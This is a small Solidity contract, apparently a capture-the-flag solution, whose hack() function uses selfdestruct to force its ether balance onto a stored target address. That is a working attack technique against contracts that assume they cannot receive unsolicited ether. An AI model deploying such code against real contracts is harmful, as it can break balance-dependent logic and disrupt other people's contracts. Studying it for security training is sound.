// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SelfDestruct {
    address public force;

    constructor(address _force) payable {
        force = _force;
    }

    function hack() public {
        selfdestruct(payable(force));
    }
}
